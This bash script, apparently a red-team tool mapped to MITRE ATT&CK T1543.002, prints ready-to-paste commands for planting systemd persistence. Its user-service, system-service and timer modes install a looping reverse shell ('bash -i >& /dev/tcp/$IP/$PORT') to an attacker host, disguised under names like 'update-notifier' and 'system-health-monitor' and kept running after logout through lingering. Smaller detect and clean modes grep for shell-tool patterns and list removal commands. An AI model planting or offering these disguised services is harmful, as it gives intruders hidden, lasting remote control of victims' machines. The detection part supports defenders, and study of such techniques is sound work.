#!/bin/bash
# Systemd Persistence
# MITRE ATT&CK: T1543.002 — Create or Modify System Process: Systemd Service
# Usage: ./systemd_persistence.sh --plant-user|--plant-system|--plant-timer|--detect|--clean

ATTACKER_IP="${ATTACKER_IP:-10.10.14.1}"
ATTACKER_PORT="${ATTACKER_PORT:-4444}"

plant_user_service() {
    local IP="${1:-$ATTACKER_IP}"
    local PORT="${2:-$ATTACKER_PORT}"

    echo "=== User-Level Systemd Service (no root required) ==="
    echo ""
    echo "# Create service directory"
    echo "mkdir -p ~/.config/systemd/user/"
    echo ""
    echo "# Create service file"
    echo "cat > ~/.config/systemd/user/update-notifier.service << EOF"
    echo "[Unit]"
    echo "Description=Desktop Update Notifier"
    echo ""
    echo "[Service]"
    echo "Type=simple"
    echo "ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/$IP/$PORT 0>&1; sleep 300; done'"
    echo "Restart=on-failure"
    echo "RestartSec=60"
    echo ""
    echo "[Install]"
    echo "WantedBy=default.target"
    echo "EOF"
    echo ""
    echo "# Enable and start"
    echo "systemctl --user daemon-reload"
    echo "systemctl --user enable update-notifier.service"
    echo "systemctl --user start update-notifier.service"
    echo ""
    echo "# Enable lingering (service runs even when user logs out)"
    echo "loginctl enable-linger \$(whoami)"
}

plant_system_service() {
    local IP="${1:-$ATTACKER_IP}"
    local PORT="${2:-$ATTACKER_PORT}"

    echo "=== System-Level Systemd Service (requires root) ==="
    echo ""
    echo "# Create service file"
    echo "cat > /etc/systemd/system/system-health-monitor.service << EOF"
    echo "[Unit]"
    echo "Description=System Health Monitor Daemon"
    echo "After=network.target"
    echo ""
    echo "[Service]"
    echo "Type=simple"
    echo "ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/$IP/$PORT 0>&1; sleep 300; done'"
    echo "Restart=always"
    echo "RestartSec=120"
    echo ""
    echo "[Install]"
    echo "WantedBy=multi-user.target"
    echo "EOF"
    echo ""
    echo "# Enable and start"
    echo "systemctl daemon-reload"
    echo "systemctl enable system-health-monitor.service"
    echo "systemctl start system-health-monitor.service"
}

plant_timer() {
    local IP="${1:-$ATTACKER_IP}"
    local PORT="${2:-$ATTACKER_PORT}"

    echo "=== Systemd Timer (stealthier — periodic execution) ==="
    echo ""
    echo "# Create the script"
    echo "cat > /usr/local/bin/sys-health-check << EOF"
    echo "#!/bin/bash"
    echo "/bin/bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1' &"
    echo "EOF"
    echo "chmod 755 /usr/local/bin/sys-health-check"
    echo ""
    echo "# Create the service unit"
    echo "cat > /etc/systemd/system/sys-health-check.service << EOF"
    echo "[Unit]"
    echo "Description=System Health Check"
    echo ""
    echo "[Service]"
    echo "Type=oneshot"
    echo "ExecStart=/usr/local/bin/sys-health-check"
    echo "EOF"
    echo ""
    echo "# Create the timer"
    echo "cat > /etc/systemd/system/sys-health-check.timer << EOF"
    echo "[Unit]"
    echo "Description=Run System Health Check Periodically"
    echo ""
    echo "[Timer]"
    echo "OnBootSec=5min"
    echo "OnUnitActiveSec=15min"
    echo ""
    echo "[Install]"
    echo "WantedBy=timers.target"
    echo "EOF"
    echo ""
    echo "# Enable timer"
    echo "systemctl daemon-reload"
    echo "systemctl enable sys-health-check.timer"
    echo "systemctl start sys-health-check.timer"
}

detect() {
    echo "=== Systemd Persistence Detection ==="
    echo ""

    echo "[*] User services:"
    for home in /home/* /root; do
        SDIR="$home/.config/systemd/user"
        [ -d "$SDIR" ] || continue
        echo "  $SDIR:"
        ls -la "$SDIR"/*.service 2>/dev/null | sed 's/^/    /'
        for svc in "$SDIR"/*.service; do
            [ -f "$svc" ] || continue
            if grep -qlE '/dev/tcp|nc\s|ncat|socat|curl|wget|python.*socket' "$svc" 2>/dev/null; then
                echo "    [!] SUSPICIOUS: $svc"
                grep -n 'ExecStart' "$svc" | sed 's/^/        /'
            fi
        done
    done

    echo ""
    echo "[*] System services (non-vendor):"
    for svc in /etc/systemd/system/*.service; do
        [ -f "$svc" ] || continue
        if grep -qlE '/dev/tcp|nc\s|ncat|socat|curl.*\|.*sh|wget.*\|.*sh|python.*socket|base64.*-d' "$svc" 2>/dev/null; then
            echo "  [!] SUSPICIOUS: $svc"
            grep -n 'ExecStart' "$svc" | sed 's/^/      /'
        fi
    done

    echo ""
    echo "[*] Active timers:"
    systemctl list-timers --all 2>/dev/null

    echo ""
    echo "[*] Failed services (may indicate persistence attempts):"
    systemctl --failed 2>/dev/null

    echo ""
    echo "[*] Users with lingering enabled:"
    ls /var/lib/systemd/linger/ 2>/dev/null
}

clean() {
    echo "=== Cleanup Commands ==="
    echo ""
    echo "# User service"
    echo "systemctl --user stop <service>"
    echo "systemctl --user disable <service>"
    echo "rm ~/.config/systemd/user/<service>.service"
    echo "systemctl --user daemon-reload"
    echo "loginctl disable-linger \$(whoami)"
    echo ""
    echo "# System service"
    echo "systemctl stop <service>"
    echo "systemctl disable <service>"
    echo "rm /etc/systemd/system/<service>.service"
    echo "systemctl daemon-reload"
    echo ""
    echo "# Timer"
    echo "systemctl stop <timer>.timer"
    echo "systemctl disable <timer>.timer"
    echo "rm /etc/systemd/system/<timer>.{service,timer}"
    echo "rm /usr/local/bin/<script>"
    echo "systemctl daemon-reload"
}

case "$1" in
    --plant-user)   plant_user_service "$2" "$3" ;;
    --plant-system) plant_system_service "$2" "$3" ;;
    --plant-timer)  plant_timer "$2" "$3" ;;
    --detect)       detect ;;
    --clean)        clean ;;
    *)
        echo "Usage: $0 --plant-user|--plant-system|--plant-timer|--detect|--clean"
        echo "  Set ATTACKER_IP and ATTACKER_PORT env vars or pass as args"
        ;;
esac
